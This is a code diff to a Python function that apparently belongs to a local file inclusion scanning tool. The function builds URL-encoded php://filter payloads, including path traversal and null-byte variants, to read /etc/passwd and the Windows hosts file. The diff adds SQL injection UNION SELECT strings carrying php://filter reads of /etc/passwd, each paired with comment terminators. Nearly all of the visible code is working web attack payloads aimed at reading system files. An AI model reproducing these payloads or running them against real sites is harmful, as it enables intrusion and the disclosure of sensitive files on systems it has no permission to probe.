@@ -15,6 +15,8 @@ def test_filter(url, post):
         print(Colors().blue("[i]") + " Testing with filter wrapper...", flush = True)
 
     tests = []
+    comment_styles = ["#", "-- "]
+
     tests.append("php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd")
     tests.append(
         "php%3A%2F%2Ffilter%2Fresource%3D..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts"
@@ -36,6 +38,16 @@ def test_filter(url, post):
     tests.append(
         "php%3A%2F%2Ffilter%2Fresource%3DC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500"
     )
+
+    injection_tests = [
+        "?id=1' UNION SELECT 'php://filter/convert.base64-encode/resource=/etc/passwd' ",
+        "%3Fid%3D1%27%20UNION%20SELECT%20%27php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd%27%20"
+    ]
+
+    for inj_test in injection_tests:
+        for comment in comment_styles:
+            tests.append(inj_test + comment)
+
 
     script = os.path.splitext(os.path.basename(urlparse.urlsplit(url).path))
     scriptName = script[0]
